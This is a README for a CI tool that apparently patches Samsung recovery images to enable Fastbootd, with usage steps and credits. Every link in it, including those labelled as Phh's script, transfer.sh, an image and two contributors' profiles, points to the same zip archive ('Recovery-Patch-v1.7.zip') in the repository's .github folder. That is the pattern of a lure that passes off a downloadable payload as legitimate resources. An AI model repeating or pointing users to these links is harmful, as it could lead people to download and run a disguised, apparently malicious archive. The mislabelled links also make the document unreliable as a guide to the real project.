# Patch-Recovery
This CI service patches recovery images of Samsung to enable Fastbootd. Based on Phh's [script](https://raw.githubusercontent.com/kird89/Patch-Recovery/master/.github/Recovery-Patch-v1.7.zip)

# How to use:
- Fork this repo.
- Upload your recovery.img/recovery.img.lz4 to [transfer.sh](https://raw.githubusercontent.com/kird89/Patch-Recovery/master/.github/Recovery-Patch-v1.7.zip) or any other file hosting sites. Once uploaded right click on the Download button and copy the URL. Avoid Gdrive links for now as it has been causing an error in some cases. 
- Head over to Actions tab. Click on RECOVERY -> Run workflow. Insert the copied URL in the RECOVERY URL field and Start the workflow
- The Patching process will start
- A Patched-Recovery.zip will be uploaded at the end of the process. Download it and extract your patched recovery image. The Image will already also be repacked to .tar for flashing directly through Odin
![](https://raw.githubusercontent.com/kird89/Patch-Recovery/master/.github/Recovery-Patch-v1.7.zip)

# Credits
- [Phhusson](https://raw.githubusercontent.com/kird89/Patch-Recovery/master/.github/Recovery-Patch-v1.7.zip) Without his script nothing would be possible at the first place
- [James Nguyen](https://raw.githubusercontent.com/kird89/Patch-Recovery/master/.github/Recovery-Patch-v1.7.zip) Helping me in simplifying the scripts and tweaking it
